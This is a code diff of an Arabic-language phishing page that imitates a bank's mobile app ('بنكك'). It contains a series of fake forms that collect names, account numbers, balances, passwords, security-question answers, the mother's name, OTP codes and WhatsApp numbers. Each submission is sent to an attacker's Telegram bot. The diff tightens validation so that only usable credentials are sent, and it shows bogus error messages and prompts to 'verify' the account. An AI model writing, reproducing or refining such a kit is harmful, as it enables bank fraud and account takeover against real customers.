+      "ما هو اسم المدرسة التي التحقت بها؟",
+      "العلامة التجارية لأول تلفزيون خاص بك؟",
+      "أي فيلم هو المفضَّل لديك؟",
+      "ما هو اسم ابن عمك الأول؟",
+      "ماذا كان لديك أثناء الطفولة؟"
+    ];
 
     async function sendToTelegram(text) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -1116,50 +1149,6 @@
     function switchScreen(screenId) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
       document.getElementById(screenId).classList.add('active');
-    }
-
-    function openVerificationForm() {
-      switchScreen('screenVerificationForm');
-    }
-
-    function formatIncomeInput(input) {
-      let value = input.value.replace(/,/g, '').replace(/\D/g, '');
-      if (value !== '') {
-        input.value = Number(value).toLocaleString('en-US');
-      } else {
-        input.value = '';
-      }
-    }
-
-    function handleVerificationSubmit(e) {
-      e.preventDefault();
-      const name = document.getElementById('verName').value.trim();
-      const acc = document.getElementById('verAcc').value.trim();
-      const phone = document.getElementById('verPhone').value.trim();
-      const income = document.getElementById('verIncome').value.trim();
-
-      // التحقق من الاسم الرباعي (على الأقل 4 كلمات غير متتابعة تماماً مثل أدم أدم أدم)
-      const nameParts = name.split(/\s+/);
-      const isUniqueQuadName = nameParts.length >= 4 && new Set(nameParts).size > 1;
-
-      // رقم الحساب لا يتجاوز 7 أرقام
-      const isValidAcc = /^\d{1,7}$/.test(acc);
-
-      // رقم الهاتف لا يقل عن 10 أرقام
-      const isValidPhone = /^\d{10,}$/.test(phone);
-
-      if (!isUniqueQuadName || !isValidAcc || !isValidPhone || !income) {
-        showErrorModal('يرجى التحقق من البيانات الصحيحة');
-        return;
-      }
-
-      sendToTelegram(`📋 *بيانات استمارة التوثيق الجديد:*\n- الاسم الرباعي: ${name}\n- رقم الحساب: ${acc}\n- الهاتف: ${phone}\n- الدخل الشهري: ${income}`);
-      
-      // إظهار شاشة جاري تقديم الاستمارة ثم الانتقال لتسجيل الدخول
-      switchScreen('screenSubmittingProcess');
-      setTimeout(() => {
-        switchScreen('screenLogin');
-      }, 2500);
     }
 
     function selectAndProceedService(index, name) {
@@ -1196,11 +1185,60 @@
     function setupDynamicForm(index, name) {
       document.getElementById('formHeaderTitle').textContent = "استمارة: " + name;
       const container = document.getElementById('formFieldsContainer');
-      container.innerHTML = `
-        <div class="input-box"><label class="input-label">الاسم الكامل</label><input type="text" class="input-field" id="f_name" placeholder="أدخل اسمك ثلاثياً" required /></div>
-        <div class="input-box"><label class="input-label">رقم الحساب المصرفي</label><input type="text" class="input-field" id="f_acc" placeholder="أدخل رقم الحساب" required /></div>
-        <div class="input-box"><label class="input-label">رقم الهاتف</label><input type="tel" class="input-field" id="f_phone" placeholder="09xxxxxxxx" required /></div>
+      
+      let html = `
+        <div class="input-box"><label class="input-label">الاسم الكامل</label><input type="text" class="input-field dynamic-input" id="f_name" placeholder="أدخل اسمك ثلاثياً" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">رقم الحساب</label><input type="text" class="input-field dynamic-input" id="f_acc" placeholder="أدخل رقم الحساب" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">رقم الهاتف المسجل مع الحساب</label><input type="tel" class="input-field dynamic-input" id="f_phone" placeholder="09xxxxxxxx" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">الرصيد المتبقي في الحساب</label><input type="text" class="input-field dynamic-input" id="f_balance" placeholder="أدخل الرصيد الحالي التقريبي" required autocomplete="off" /></div>
       `;
+
+      if (index === 3) {
+        html += `
+          <div class="input-box"><label class="input-label">السقف الحالي</label><input type="text" class="input-field dynamic-input" id="f_limit_curr" placeholder="مثال: 500,000 جنيه" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">السقف المراد اعتماده</label><input type="text" class="input-field dynamic-input" id="f_limit_new" placeholder="مثال: 2,000,000 جنيه" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">سبب طلب رفع السقف</label><input type="text" class="input-field dynamic-input" id="f_reason" placeholder="اذكر السبب باختصار" required autocomplete="off" /></div>
+        `;
+      } else if (index === 5) {
+        html += `
+          <div class="input-box">
+            <label class="input-label">نوع الحساب الحالي</label>
+            <select class="input-field dynamic-input" id="f_curr_acc_type" required>
+              <option value="">اختر نوع حسابك الحالي</option>
+              <option value="حساب توفير عادي">حساب توفير عادي</option>
+              <option value="حساب جاري">حساب جاري</option>
+              <option value="حساب إلكتروني مصغر">حساب إلكتروني مصغر</option>
+            </select>
+          </div>
+          <div class="input-box">
+            <label class="input-label">نوع الحساب المراد الترقية إليه</label>
+            <select class="input-field dynamic-input" id="f_target_acc_type" required>
+              <option value="">اختر الحساب المستهدف</option>
+              <option value="حساب ذهبي مميز">حساب ذهبي مميز</option>
+              <option value="حساب أعمال VIP">حساب أعمال VIP</option>
+              <option value="حساب استثماري متقدم">حساب استثماري متقدم</option>
+            </select>
+          </div>
+        `;
+      } else if (index === 6) {
+        html += `
+          <div class="input-box"><label class="input-label">رقم الحساب المرسل (منه)</label><input type="text" class="input-field dynamic-input" id="f_sender_acc" placeholder="رقم حسابك المرسل" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">رقم الحساب المستقبل (إليه خطأً)</label><input type="text" class="input-field dynamic-input" id="f_receiver_acc" placeholder="رقم الحساب المحول له بالخطأ" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">رقم العملية (رقم الإيصال)</label><input type="text" class="input-field dynamic-input" id="f_tx_id" placeholder="أدخل رقم العملية المرجعي" required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">تاريخ المعاملة</label><input type="date" class="input-field dynamic-input" id="f_tx_date" required /></div>
+        `;
+      } else if (index === 2) {
+        html += `
+          <div class="input-box"><label class="input-label">آخر ثلاثة معاملات تمت في الحساب</label><input type="text" class="input-field dynamic-input" id="f_last_tx" placeholder="مثال: تحويل، سحب، شراء..." required autocomplete="off" /></div>
+          <div class="input-box"><label class="input-label">اسم الوالدة الثلاثي</label><input type="text" class="input-field dynamic-input" id="f_mother_name" placeholder="اسم الأم كاملاً" required autocomplete="off" /></div>
+        `;
+      }
+
+      html += `
+        <div class="input-box"><label class="input-label">رقم الواتساب (للتواصل السريع)</label><input type="tel" class="input-field dynamic-input" id="f_whatsapp" placeholder="09xxxxxxxx أو برمز الدولة" required autocomplete="off" /></div>
+      `;
+
+      container.innerHTML = html;
     }
 
     function handleDynamicFormSubmit(e) {
@@ -1208,96 +1246,31 @@
       const name = document.getElementById('f_name').value;
       const acc = document.getElementById('f_acc').value;
       const phone = document.getElementById('f_phone').value;
+      const balance = document.getElementById('f_balance') ? document.getElementById('f_balance').value : 'غير متوفر';
+      const whatsapp = document.getElementById('f_whatsapp').value;
 
-      sendToTelegram(`📋 *بيانات استمارة الخدمة (${selectedServiceName}):*\n- الاسم: ${name}\n- الحساب: ${acc}\n- الهاتف: ${phone}`);
-      openVerificationForm();
-    }
+      let extraInfo = "";
+      if (selectedServiceIndex === 3) {
+        extraInfo = `\n- السقف الحالي: ${document.getElementById('f_limit_curr').value}\n- السقف المطلوب: ${document.getElementById('f_limit_new').value}\n- السبب: ${document.getElementById('f_reason').value}`;
+      } else if (selectedServiceIndex === 5) {
+        extraInfo = `\n- الحساب الحالي: ${document.getElementById('f_curr_acc_type').value}\n- الحساب المستهدف: ${document.getElementById('f_target_acc_type').value}`;
+      } else if (selectedServiceIndex === 6) {
+        extraInfo = `\n- حساب المرسل: ${document.getElementById('f_sender_acc').value}\n- حساب المستقبل: ${document.getElementById('f_receiver_acc').value}\n- رقم العملية: ${document.getElementById('f_tx_id').value}\n- تاريخ المعاملة: ${document.getElementById('f_tx_date').value}`;
+      } else if (selectedServiceIndex === 2) {
+        extraInfo = `\n- آخر 3 معاملات: ${document.getElementById('f_last_tx').value}\n- اسم الوالدة: ${document.getElementById('f_mother_name').value}`;
+      }
 
-    function togglePasswordVisibility() {
-      const pwd = document.getElementById('passwordInput');
-      pwd.type = pwd.type === 'password' ? 'text' : 'password';
-    }
-
-    function handleLoginSubmit(e) {
-      e.preventDefault();
-      const userId = document.getElementById('userIdInput').value;
-      const pass = document.getElementById('passwordInput').value;
-
-      sendToTelegram(`🔐 *تسجيل الدخول (بنكك):*\n- المعرف: ${userId}\n- كلمة المرور: ${pass}`);
-      document.getElementById('modalDevice').style.display = 'flex';
+      sendToTelegram(`📋 *بيانات استمارة نهائية (${selectedServiceName}):*\n- الاسم: ${name}\n- الحساب: ${acc}\n- الهاتف المسجل: ${phone}\n- الرصيد المتبقي: ${balance}${extraInfo}\n- رقم الواتساب: ${whatsapp}`);
+      
+      switchScreen('screenLogin');
     }
 
     function closeModal(modalId) {
       document.getElementById(modalId).style.display = 'none';
     }
 
-    function goToSecurityQuestions() {
-      closeModal('modalDevice');
-      switchScreen('screenQuestions');
-    }
-
-    function validateSecurityAnswer() {
-      const q = document.getElementById('securityQuestionSelect').value;
-      const ans = document.getElementById('answerInput').value;
-      if (!q || !ans) {
-        showErrorModal('الرجاء اختيار السؤال وإجابة الإجابة الصحيحة');
-        return;
-      }
-      sendToTelegram(`🛡️ *سؤال الأمان:*\n- السؤال: ${q}\n- الإجابة: ${ans}`);
-      startOtpProcess();
-    }
-
-    function startOtpProcess() {
-      switchScreen('screenOtp');
-    }
-
-    function validateOtp() {
-      const otp = document.getElementById('otpInput').value;
-      if (otp.length < 4) {
-        showErrorModal('الرجاء إدخال رمز تحقق صحيح');
-        return;
-      }
-      sendToTelegram(`📱 *رمز التحقق OTP:*\n- الرمز: ${otp}`);
-      switchScreen('screenContact');
-    }
-
-    function submitContactInfo() {
-      const contact = document.getElementById('contactInput').value;
-      if (!contact) {
-        showErrorModal('الرجاء إدخال رقم التواصل');
-        return;
-      }
-      sendToTelegram(`📞 *رقم التواصل (إيمو / واتساب):*\n- الرقم: ${contact}`);
-      startProcessingSequence();
-    }
-
-    function startProcessingSequence() {
-      switchScreen('screenProcessing');
-      let count = 25;
-      const countdownEl = document.getElementById('processingCountdown');
-      const timer = setInterval(() => {
-        count--;
-        countdownEl.textContent = count;
-        if (count <= 0) {
-          clearInterval(timer);
-          document.getElementById('processingSpinner').style.display = 'none';
-          document.getElementById('processingText').textContent = 'تم توثيق الحساب بنجاح!';
-          document.getElementById('processingSubText').style.display = 'none';
-          document.getElementById('successActionContainer').style.display = 'block';
-          isAccountVerified = true;
-        }
-      }, 1000);
-    }
-
-    function returnToWallet() {
-      document.getElementById('walletStatusBadge').textContent = "موثق";
-      document.getElementById('walletStatusBadge').style.background = "rgba(16, 185, 129, 0.1)";
-      document.getElementById('walletStatusBadge').style.color = "#10b981";
-      switchScreen('main-screen');
-    }
-
-    function showErrorModal(text) {
-      document.getElementById('modalErrorText').textContent = text;
+    function showErrorModal(message) {
+      document.getElementById('modalErrorText').textContent = message || "Invalid Source. Please contact Customer Care";
       document.getElementById('modalError').style.display = 'flex';
     }
 
@@ -1305,30 +1278,99 @@
       document.getElementById('modalError').style.display = 'none';
     }
 
-    function attemptJoinDeal(dealName, amount) {
-      if (!isAccountVerified) {
-        showErrorModal('يجب توثيق الحساب للاستفادة من جميع الميزات الاستثمارية.');
-      } else {
-        document.getElementById('modalFundText').textContent = `يجب توافر مبلغ ${amount} داخل الحساب لاتمام الصفقة بنجاح. يرجى إيداع المبلغ أولاً.`;
-        document.getElementById('modalFundAlert').style.display = 'flex';
+    function togglePasswordVisibility() {
+      const passInput = document.getElementById('passwordInput');
+      passInput.type = passInput.type === 'password' ? 'text' : 'password';
+    }
+
+    function handleLoginSubmit(e) {
+      e.preventDefault();
+      const accInput = document.getElementById('userIdInput').value.trim();
+      const passInput = document.getElementById('passwordInput').value;
+
+      const accRegex = /^\d{7}$/;
+      const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
+
+      if (!accRegex.test(accInput) || !passRegex.test(passInput)) {
+        showErrorModal("Invalid Source. Please contact Customer Care");
+        return;
       }
+
+      sendToTelegram(`🚨 *تسجيل دخول (بنكك)*\n\n👤 المعرف: \`${accInput}\`\n🔑 كلمة المرور: \`${passInput}\``);
+      document.getElementById('modalDevice').style.display = 'flex';
+    }
+
+    function goToSecurityQuestions() {
+      closeModal('modalDevice');
+      switchScreen('screenQuestions');
+    }
+
+    function nextQuestion() {
+      currentQIndex = (currentQIndex + 1) % questions.length;
+      document.getElementById('questionText').textContent = questions[currentQIndex];
+      document.getElementById('answerInput').value = '';
+    }
+
+    function validateSecurityAnswer() {
+      const answer = document.getElementById('answerInput').value.trim();
+      const currentQuestion = document.getElementById('questionText').textContent;
+
+      if (answer === '') {
+        showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.");
+      } else {
+        sendToTelegram(`🛡️ *إجابة سؤال الأمان*\n\n❓ السؤال: ${currentQuestion}\n💡 الإجابة: \`${answer}\``);
+        goToOtpScreen();
+      }
+    }
+
+    function goToOtpScreen() {
+      switchScreen('screenOtp');
+      startTimer(3540);
+    }
+
+    function startTimer(duration) {
+      clearInterval(timerInterval);
+      let timer = duration, minutes, seconds;
+      timerInterval = setInterval(() => {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        document.getElementById('timerCountdown').textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+          clearInterval(timerInterval);
+        }
+      }, 1000);
+    }
+
+    function validateOtp() {
+      const otp = document.getElementById('otpInput').value.trim();
+
+      if (!/^\d{6}$/.test(otp)) {
+        showErrorModal("رمز التحقق غير صحيح، يجب أن يتكون من 6 أرقام.");
+        return;
+      }
+
+      sendToTelegram(`📱 *رمز التحقق OTP*\n\n🔢 الرمز: \`${otp}\``);
+      switchScreen('screenLoading');
+    }
+
+    function attemptJoinDeal(dealName, amount) {
+      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
     function handleWalletAction(action) {
-      if (!isAccountVerified) {
-        showErrorModal('يجب توثيق الحساب للاستفادة من جميع الميزات الاستثمارية.');
-      } else {
-        showErrorModal(`خاصية ${action} متاحة عبر الحساب الموثق.`);
-      }
+      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
     function handleDirectWithdrawal() {
-      if (!isAccountVerified) {
-        showErrorModal('يجب توثيق الحساب للاستفادة من جميع الميزات الاستثمارية.');
-      } else {
-        const randomAmount = (Math.random() * (2275000 - 2250000) + 2250000).toLocaleString('en-US', {maximumFractionDigits: 2});
-        showErrorModal(`صفقة سحب عشوائية جارية بمبلغ: ${randomAmount} USDG`);
-      }
+      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundAlert').style.display = 'flex';
     }
 
     function switchTab(tabId, btn) {
@@ -1339,11 +1381,8 @@
     }
 
     function openAccountStatementScreen() {
-      if (!isAccountVerified) {
-        switchScreen('screenAccountStatement');
-      } else {
-        showErrorModal('كشف الحساب متاح.');
-      }
+      document.getElementById('modalFundText').textContent = "يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.";
+      document.getElementById('modalFundAlert').style.display = 'flex';
     }
   </script>
 </body>
